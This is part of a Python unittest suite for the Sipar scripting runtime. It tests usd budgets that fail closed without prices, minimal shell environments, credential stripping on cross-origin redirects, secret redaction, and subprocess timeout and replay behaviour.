        self.assertLess(dt, 2.0)


# ================================================================== F10 usd budget without prices (a17)

class F10Usd(Base):
    SRC = 'let m = try { budget(usd: 1) { ask("a") } } catch e { "[{e.kind}] {e.message}" }\nprint(m)'

    def test_S10_1_no_price_fails_closed(self):
        for env in ({}, {"SIPAR_PRICE_IN": "1"}, {"SIPAR_PRICE_OUT": "1"},
                    {"SIPAR_PRICE_IN": "abc", "SIPAR_PRICE_OUT": "1"}, {"SIPAR_PRICE_IN": "-1", "SIPAR_PRICE_OUT": "1"},
                    {"SIPAR_PRICE_IN": "nan", "SIPAR_PRICE_OUT": "1"}, {"SIPAR_PRICE_IN": "1", "SIPAR_PRICE_OUT": "inf"}):
            with self.subTest(env=env):
                p = self.P(self.SRC, AI_S)
                out = p.run(env=dict(env, SIPAR_MODEL="mock"))
                self.assertTrue(out.startswith("[budget] budget(usd: 1) needs the model's price"), out)
                self.assertIn("SIPAR_PRICE_IN", out)
                self.assertIn("SIPAR_PRICE_OUT", out)

    def test_S10_2_declared_prices(self):
        p = self.P(self.SRC, AI_S)
        self.assertEqual(p.run(env={"SIPAR_MODEL": "mock", "SIPAR_PRICE_IN": "0", "SIPAR_PRICE_OUT": "0"}),
                         "mock answer\n")
        p = self.P(self.SRC.replace("usd: 1", "usd: 0.000001"), AI_S)
        out = p.run(env={"SIPAR_MODEL": "mock", "SIPAR_PRICE_IN": "1000", "SIPAR_PRICE_OUT": "1000"})
        self.assertTrue(out.startswith("[budget] usd budget exceeded"), out)

    def test_S10_3_no_usd_limit_needs_no_price(self):
        p = self.P('print(budget(tokens: 100000, ai_calls: 3) { ask("a") })', AI_S)
        self.assertEqual(p.run(env={"SIPAR_MODEL": "mock"}), "mock answer\n")

    def test_S10_4_replay_uses_recorded_price(self):
        p = self.P(self.SRC, AI_S)
        out, entries = record(p, env={"SIPAR_MODEL": "openrouter/x/y | mock", "SIPAR_PRICE_IN": "0",
                                      "SIPAR_PRICE_OUT": "0", "OPENROUTER_API_KEY": ""})
        self.assertEqual(out, "mock answer\n")
        self.assertEqual(len([e for e in entries if e["kind"] == "ai"]), 2)       # a failed attempt, then mock
        replayed = p.run(journal=Journal(replay=json.loads(json.dumps(entries))), env={"SIPAR_MODEL": "mock"})
        self.assertEqual(replayed, out)
        out2, entries2 = record(p, env={"SIPAR_MODEL": "mock"})                   # unpriced run: fails closed ...
        self.assertTrue(out2.startswith("[budget]"), out2)
        # ... and a journal whose ai entry has no cost cannot be replayed through a usd budget either
        unpriced = [dict(e, meta={"model": "mock"}) for e in entries if e["kind"] == "ai"][1:]
        replayed = p.run(journal=Journal(replay=json.loads(json.dumps(unpriced))),
                         env={"SIPAR_PRICE_IN": "0", "SIPAR_PRICE_OUT": "0"})
        self.assertTrue(replayed.startswith("[budget] budget(usd: 1) needs"), replayed)


# ================================================================== F11 shell env + redirect headers (a21, a4)

class F11ShellRedirect(Base):
    def test_S11_1_shell_env_is_minimal(self):
        p = self.P('print(shell.run("env"))', 'allow shell ["env"]\nallow env ["SIPAR_T_SHOWN"]')
        out = p.run(env={"SIPAR_T_HIDDEN": "h1dden", "SIPAR_T_SHOWN": "sh0wn", "PATH": os.environ["PATH"]})
        names = {ln.split("=", 1)[0] for ln in out.splitlines() if "=" in ln}
        self.assertNotIn("h1dden", out)
        self.assertIn("SIPAR_T_SHOWN=sh0wn", out.splitlines())
        self.assertIn("PATH", names)
        self.assertLessEqual(names, {"PATH", "HOME", "LANG", "TMPDIR", "SIPAR_T_SHOWN", "PWD", "SHLVL", "_",
                                     "__CF_USER_TEXT_ENCODING"})

    def test_S11_1b_bare_allow_env_adds_nothing(self):
        p = self.P('print(shell.run("env"))', 'allow shell ["env"]\nallow env')
        out = p.run(env={"SIPAR_T_HIDDEN": "h1dden"})
        self.assertNotIn("h1dden", out)

    def test_S11_2_secret_names_never_passed(self):
        p = self.P('print(shell.run("env"))', 'allow shell ["env"]\nallow env ["TOK", "HOME"]\nallow secret ["TOK"]')
        out = p.run(env={"TOK": SECRET})
        no_secret(self, out)
        self.assertNotIn("TOK=", out)

    def redirect(self, same: bool) -> dict:
        a, b = Server(), Server()
        self.addCleanup(a.close)
        self.addCleanup(b.close)
        target = (a if same else b).url + "/echo"
        p = self.P(f'let k = env.secret("TOK")\nlet r = http.get("{a.url}/redirect?to={target}", headers: '
                   '["Authorization": "Bearer plain", "Cookie": "c=1", "X-Api": k, "X-Plain": "p"])\nprint("ok")',
                   'allow net\nallow secret ["TOK"]')
        self.assertEqual(p.run(env={"TOK": SECRET}), "ok\n")
        hits = [h for h in (a.hits + b.hits) if h["path"].startswith("/echo")]
        self.assertEqual(len(hits), 1)
        return {k.lower(): v for k, v in hits[0]["headers"].items()}

    def test_S11_3_cross_origin_redirect_drops_credentials(self):
        h = self.redirect(same=False)
        for name in ("authorization", "cookie", "x-api"):
            self.assertNotIn(name, h)
        self.assertEqual(h.get("x-plain"), "p")
        no_secret(self, json.dumps(h))

    def test_S11_4_same_origin_redirect_keeps_headers(self):
        h = self.redirect(same=True)
        self.assertEqual((h.get("authorization"), h.get("cookie"), h.get("x-plain")), ("Bearer plain", "c=1", "p"))
        self.assertEqual(h.get("x-api"), SECRET)


# ================================================================== mutation survivors (mutcheck, 8 Nov)

class MutantKills(Base):
    """Each test pins a behaviour that a surviving mutant changed without any other test noticing."""

    def test_journal_short_cuts_at_120(self):
        from sipar.runtime.journal import _short
        self.assertEqual(_short("a" * 118), '"' + "a" * 118 + '"')            # 120 chars: kept whole
        self.assertEqual(_short("a" * 119), '"' + "a" * 119 + "…")             # 121 chars: cut to 120 + …

    def test_journal_first_diff_window(self):
        from sipar.runtime.journal import first_diff
        a, b = "x" * 50 + "A" + "y" * 60, "x" * 50 + "B" + "y" * 60
        win_a, win_b = "x" * 20 + "A" + "y" * 39, "x" * 20 + "B" + "y" * 39
        self.assertEqual(first_diff(a, b), f"$ differs at char 50: journal {win_a!r} vs program {win_b!r}")

    def test_journal_bad_json_line_message(self):
        p = self.P('print(1)', '')
        path = os.path.join(p.dir, "j.jsonl")
        with open(path, "w") as fh:
            fh.write('{"kind": "time", "request": {}}\n{oops\n')
        with self.assertRaises(SiparRuntimeError) as cm:
            Journal.load(path)
        self.assertEqual((cm.exception.kind, cm.exception.message), ("replay", "journal j.jsonl line 2 is not valid JSON"))

    def test_journal_ms_rounded_to_3(self):
        p = self.P('for i in 0..8 { let t = time.now() }', 'allow time')
        _, entries = record(p)
        self.assertEqual(len(entries), 8)
        for e in entries:
            self.assertEqual(e["ms"], round(e["ms"], 3))

    def test_journal_divergence_messages_cut_at_80(self):
        from sipar.runtime.journal import _short
        p = self.P('print(fs.exists("{0}"))'.replace("{0}", "q" * 200), 'allow fs.read ["."]')
        _, entries = record(p)
        req = entries[0]["request"]
        for journal, n in (([], 1), ([{"seq": 1, "kind": "time", "request": req, "response": 1.0, "labels": []}], 2)):
            with self.subTest(n=n):
                with self.assertRaises(SiparRuntimeError) as cm:
                    p.run(journal=Journal(replay=journal))
                m = cm.exception.message
                self.assertEqual((cm.exception.kind, m.count(_short(req, 80))), ("replay", n), m)
                self.assertNotIn(_short(req, 81), m)

    def test_netio_https_handler_uses_deadline(self):
        import socket
        import urllib.request
        from sipar.runtime import netio
        dl = netio._Deadline(5)
        hs = netio._handlers(dl)[1]
        got = {}

        def do_open(conn, req, context=None):
            got["conn"], got["ctx"] = conn(req.host), context
            return "opened"
        hs.do_open = do_open
        self.assertEqual(hs.https_open(urllib.request.Request("https://127.0.0.1:9/")), "opened")
        self.assertIs(got["ctx"], hs._context)
        lst = socket.socket()
        lst.bind(("127.0.0.1", 0))
        lst.listen(1)
        self.addCleanup(lst.close)
        s = got["conn"]._create_connection(("127.0.0.1", lst.getsockname()[1]), 2)
        self.addCleanup(s.close)
        self.assertEqual(dl.socks, [s])                    # the HTTPS socket is cut when the deadline fires

    def test_time_budget_message(self):
        p = self.P('print(try { budget(seconds: 0.05) { while true { } } } catch e { e.message })', '')
        self.assertRegex(p.run(), r"^time budget exceeded: \d+\.\d\ds > 0\.05s \(")

    def test_mock_defaults_per_json_type(self):
        from sipar.runtime.providers import default_for_schema
        for schema, want in (({"type": "number"}, 0.0), ({"type": "string"}, "mock"), ({"type": "boolean"}, False),
                             ({"type": "integer"}, 0), ({"type": "array"}, [])):
            with self.subTest(schema=schema):
                got = default_for_schema(schema)
                self.assertEqual((type(got), got), (type(want), want))


class MutantKillsProvider(Base):
    def setUp(self):
        self.srv = Server()
        self.addCleanup(self.srv.close)
        self.env = {"SIPAR_MODEL": "openrouter/t/m", "SIPAR_OPENROUTER_URL": self.srv.url,
                    "OPENROUTER_API_KEY": "test-key-not-real"}

    def msg(self, env=None) -> str:
        p = self.P('print(try { ask("a") } catch e { "[{e.kind}] {e.message}" })', AI_S)
        return p.run(env=env or self.env)

    def test_openrouter_sends_x_title(self):
        self.srv.chat_reply = {"choices": [{"message": {"content": "hi"}}]}
        self.assertEqual(self.msg(), "hi\n")
        self.assertEqual(self.srv.hits[-1]["headers"].get("X-Title"), "Sipar")
        self.msg({"SIPAR_MODEL": "local/m", "SIPAR_LOCAL_URL": self.srv.url})
        self.assertNotIn("X-Title", self.srv.hits[-1]["headers"])

    def test_provider_error_field_is_reported(self):
        for err in ({"message": "rate limited"}, "rate limited"):
            with self.subTest(err=err):
                self.srv.chat_reply = {"error": err, "choices": [{"message": {"content": "hi"}}]}
                self.assertEqual(self.msg(), "[ai] openrouter: rate limited\n")

    def test_connection_dropped_is_ai_error(self):
        self.srv.chat_hangup = True
        self.assertRegex(self.msg(), r"^\[ai\] openrouter: connection error: ")


class MutantKillsEffects(Base):
    def test_secret_not_listed_message(self):
        p = self.P('print(env.secret("B"))', 'allow secret ["A"]')
        e = p.error()
        self.assertEqual((e.kind, e.message), ("capability", "secret 'B' is not in 'allow secret'"))

    def test_origin_default_ports(self):
        from sipar.runtime.effects import _origin
        self.assertEqual(_origin("HTTPS://A.Example/x"), ("https", "a.example", 443))
        self.assertEqual(_origin("https://a.example:443/y"), _origin("https://a.example/z"))
        self.assertEqual(_origin("http://a.example/"), ("http", "a.example", 80))

    def test_deadline_ignores_zero_and_bad_values(self):
        from sipar.runtime.effects import _deadline

        class RT:
            def budget_remaining_seconds(self):
                return None
        for v in ("0", "-1", "nan", "abc"):
            with self.subTest(v=v), unittest.mock.patch.dict(os.environ, {"SIPAR_T_TIMEOUT": v}):
                self.assertEqual(_deadline(RT(), "SIPAR_T_TIMEOUT", 30), (30, False))
        with unittest.mock.patch.dict(os.environ, {"SIPAR_T_TIMEOUT": "2.5"}):
            self.assertEqual(_deadline(RT(), "SIPAR_T_TIMEOUT", 30), (2.5, False))

    def test_http_default_timeout_is_30s(self):
        from sipar.runtime import netio
        seen = []

        def fake(req, seconds, limit, handlers=()):
            seen.append(seconds)
            return b"ok"
        p = self.P('print(http.get("http://127.0.0.1:9/x"))', 'allow net ["127.0.0.1"]')
        with unittest.mock.patch.object(netio, "fetch", fake):
            self.assertEqual(p.run(env={"SIPAR_HTTP_TIMEOUT": ""}), "ok\n")
        self.assertEqual(seen, [30])

    def test_http_error_body_window(self):
        srv = Server()
        self.addCleanup(srv.close)
        srv.status_body = " " * 499 + "AB"
        p = self.P(f'print(try {{ http.get("{srv.url}/status/500") }} catch e {{ e.message }})',
                   'allow net ["127.0.0.1"]')
        self.assertEqual(p.run(), "GET 127.0.0.1: HTTP 500 Internal Server Error: A\n")   # only 500 bytes read

    def test_http_error_response_is_closed(self):
        import gc, warnings
        srv = Server()
        self.addCleanup(srv.close)
        srv.status_body = "nope"
        p = self.P(f'print(try {{ http.get("{srv.url}/status/500") }} catch e {{ e.kind }})',
                   'allow net ["127.0.0.1"]')
        with warnings.catch_warnings(record=True) as w:
            warnings.simplefilter("always", ResourceWarning)
            self.assertEqual(p.run(), "io\n")
            gc.collect()
        self.assertEqual([str(x.message) for x in w if x.category is ResourceWarning], [])

    def test_refused_redirect_response_is_closed(self):
        import gc, socket
        srv = Server()
        self.addCleanup(srv.close)
        target = f"http://localhost:{srv.port}/ok"
        p = self.P(f'print(http.get("{srv.url}/redirect?to={target}"))', 'allow net ["127.0.0.1"]')
        e = p.error()                                    # keeps the traceback (and so the 3xx response) alive
        self.assertEqual(e.kind, "capability")
        half_closed = [o for o in gc.get_objects()
                       if type(o) is socket.socket and getattr(o, "_closed", False) and o.fileno() != -1]
        self.assertEqual(half_closed, [])                # the 3xx response was closed, its fd released

    def test_http_connection_dropped_is_io_error(self):
        srv = Server()
        self.addCleanup(srv.close)
        p = self.P(f'print(try {{ http.get("{srv.url}/hangup") }} catch e {{ "[{{e.kind}}] {{e.message}}" }})',
                   'allow net ["127.0.0.1"]')
        self.assertRegex(p.run(), r"^\[io\] GET 127\.0\.0\.1: RemoteDisconnected: ")

    def popen_rec(self, interrupt=False):
        import subprocess

        class Rec(subprocess.Popen):
            made: list = []
            calls = 0

            def __init__(s, *a, **k):
                super().__init__(*a, **k)
                Rec.made.append(s)

                def last_resort(proc=s):
                    if proc.returncode is None:
                        proc.kill()
                        proc.wait()
                self.addCleanup(last_resort)

            def communicate(s, *a, **k):
                Rec.calls += 1
                if interrupt and Rec.calls == 1:
                    raise KeyboardInterrupt
                return super().communicate(*a, **k)
        return unittest.mock.patch.object(subprocess, "Popen", Rec), Rec

    def test_shell_timeout_reaps_the_command(self):
        patch, rec = self.popen_rec()
        p = self.P('print(try { shell.run("sleep 30") } catch e { e.message })', 'allow shell ["sleep"]')
        with patch:
            self.assertEqual(p.run(env={"SIPAR_SHELL_TIMEOUT": "0.3"}), "command 'sleep' timed out after 0.3s\n")
        self.assertEqual(len(rec.made), 1)
        self.assertIsNotNone(rec.made[0].returncode)          # waited for: no zombie, pipes closed

    def test_shell_interrupt_kills_the_command(self):
        patch, rec = self.popen_rec(interrupt=True)
        p = self.P('print(shell.run("sleep 30"))', 'allow shell ["sleep"]')
        with patch, self.assertRaises(KeyboardInterrupt):
            p.run()
        self.assertIsNotNone(rec.made[0].returncode)          # Ctrl-C does not leave the command running

    def test_shell_timeout_with_escaped_grandchild(self):
        # the grandchild leaves the process group (setsid) and keeps the output pipe open: the runtime gives up
        # waiting after 2 s, closes its pipe ends and reports the timeout (no internal error)
        gc = "import os, time\nos.setsid()\nopen('gc.pid', 'w').write(str(os.getpid()))\ntime.sleep(8)\n"
        p = self.P('print(try { shell.run("sh -c \'python3 gc.py & sleep 30\'") } catch e { "[{e.kind}] {e.message}" })',
                   'allow shell ["sh"]', dict(OUT, **{"gc.py": gc}))

        def kill_gc():
            try:
                with open(os.path.join(p.dir, "gc.pid")) as fh:
                    os.kill(int(fh.read()), 9)
            except (OSError, ValueError):
                pass
        self.addCleanup(kill_gc)
        patch, rec = self.popen_rec()
        t0 = time.monotonic()
        with patch:
            out = p.run(env={"SIPAR_SHELL_TIMEOUT": "0.5"})
        dt = time.monotonic() - t0
        self.assertIsNotNone(rec.made[0].returncode)          # the killed command is reaped
        self.assertEqual(out, "[io] command 'sh' timed out after 0.5s\n")
        self.assertTrue(os.path.exists(os.path.join(p.dir, "gc.pid")), "the escaping grandchild did not start")
        self.assertGreater(dt, 2.3)                             # it really waited for the held pipe ...
        self.assertLess(dt, 5)                                  # ... but not for the grandchild's 8 s

    def test_replay_missing_secret_message(self):
        p = self.P('let k = env.secret("API_KEY")\nprint("ok")', 'allow secret ["API_KEY"]')
        _, entries = record(p, env={"API_KEY": SECRET})
        with self.assertRaises(SiparRuntimeError) as cm:
            p.run(journal=Journal(replay=entries))
        self.assertEqual(cm.exception.message, "secret 'API_KEY' is not set in the environment; replay needs "
                                               "the same value as the recorded run")

    def test_replay_sleep_advances_virtual_clock(self):
        p = self.P('sleep(0.25)\nsleep(0.5)', 'allow time')
        t0 = time.monotonic()
        p.run(journal=Journal(replay=[]))
        self.assertLess(time.monotonic() - t0, 0.5)            # replay does not really sleep
        self.assertEqual((p.last.journal.vclock, p.last.now()), (0.75, 0.75))


class MutantKillsCore(Base):
    def test_short_secret_registered_from_4_chars(self):
        from sipar.errors import redact_text, register_secret
        register_secret("wq7z", "secret:MK4")
        register_secret("wq7", "secret:MK3")
        self.assertEqual(redact_text("a wq7z b WQ7Z"), "a «secret:MK4» b «secret:MK4»")
        self.assertEqual(redact_text("c wq7 d"), "c wq7 d")                # 3 chars: too short to redact text

    def test_longer_secret_replaced_first(self):
        from sipar.errors import redact_text, register_secret
        register_secret("kp9r", "secret:SHORTMK")
        register_secret("kp9r-tail-555", "secret:LONGMK")
        self.assertEqual(redact_text("x kp9r-tail-555 y"), "x «secret:LONGMK» y")    # no "-tail-555" left over

    def test_error_repr_and_args_redacted(self):
        from sipar.errors import register_secret
        register_secret("rp-Secret-1234", "secret:RP")
        e = SiparRuntimeError("io", "failed with rp-Secret-1234")
        self.assertEqual(e.args, ("failed with «secret:RP»",))
        self.assertEqual(repr(e), "SiparRuntimeError('io', 'failed with «secret:RP»')")
        e.message = "now rp-secret-1234"
        self.assertEqual(e.args, ("now «secret:RP»",))

    def test_json_candidates_limits(self):
        from sipar.runtime.ai import json_candidates
        self.assertEqual(json_candidates("{x " * 39 + '{"a": 1}'), [{"a": 1}])     # the 40th start is tried
        self.assertEqual(json_candidates("{x " * 40 + '{"a": 1}'), [])             # the 41st is not
        huge = "{x" + " " * 2_100_000 + '{"a": 1}'
        self.assertEqual(json_candidates(huge), [])                                 # > 2 MB: one start only

    def test_json_candidates_keeps_earlier_hits_on_deep_nesting(self):
        from sipar.runtime.ai import json_candidates
        self.assertEqual(json_candidates('{"a": 1} ' + "[" * 200_000), [{"a": 1}])

    def test_bool_word_fallbacks(self):
        from sipar import ast as A
        from sipar.runtime.ai import _scalar_fallbacks
        b = A.TName(0, 0, "Bool")
        for text, want in (("Yes.", [True]), ("true!", [True]), ("no", [False]), ("False.", [False]),
                           ("maybe", [])):
            with self.subTest(text=text):
                self.assertEqual(_scalar_fallbacks(text, b), want)

    def test_decode_int_bounds_and_fn(self):
        from sipar import ast as A
        from sipar.runtime.decode import from_json
        from sipar.runtime.values import MAX_INT_BITS, check_int
        i = A.TName(0, 0, "Int")
        self.assertEqual(from_json(1e18, i, None), 10 ** 18)
        with self.assertRaises(SiparRuntimeError):
            from_json(1.1e18, i, None)
        self.assertEqual(from_json(2 ** MAX_INT_BITS - 1, i, None), 2 ** MAX_INT_BITS - 1)
        with self.assertRaises(SiparRuntimeError) as cm:
            from_json(2 ** MAX_INT_BITS, i, None)
        self.assertEqual(cm.exception.kind, "value")    # round 5 F6: SPEC §5 says too-large Ints are `value`
        check_int(2 ** MAX_INT_BITS - 1)
        with self.assertRaises(SiparRuntimeError) as cm:
            check_int(2 ** MAX_INT_BITS)
        self.assertEqual(cm.exception.kind, "value")
        with self.assertRaises(SiparRuntimeError) as cm:
            from_json(1, A.TFn(0, 0, [], i), None)
        self.assertIn("cannot decode a function", cm.exception.message)

    def test_to_json_of_a_function(self):
        from sipar.runtime.values import to_json
        self.assertEqual(to_json([lambda: 0]), ["<fn>"])

    def test_usd_needs_price_message(self):
        p = self.P('print(try { budget(usd: 1) { ask("a") } } catch e { e.message })', AI_S)
        self.assertRegex(p.run(), r"^budget\(usd: 1\) needs the model's price: set SIPAR_PRICE_IN and "
                                  r"SIPAR_PRICE_OUT \(USD per 1M input / output tokens; 0 is allowed\) \(")

    def test_usd_spent_equal_to_limit_is_allowed(self):
        p = self.P('print(ask("a"))', AI_S)
        _, entries = record(p, env={"SIPAR_PRICE_IN": "0", "SIPAR_PRICE_OUT": "1000000"})
        k = entries[0]["response"]["usage"]["output"]               # 1 USD per output token
        self.assertEqual(entries[0]["meta"]["usd"], k)
        q = self.P(f'print(try {{ budget(usd: {k}) {{ ask("a") }} }} catch e {{ e.message }})', AI_S)
        self.assertEqual(q.run(env={"SIPAR_PRICE_IN": "0", "SIPAR_PRICE_OUT": "1000000"}), "mock answer\n")


if __name__ == "__main__":
    unittest.main()
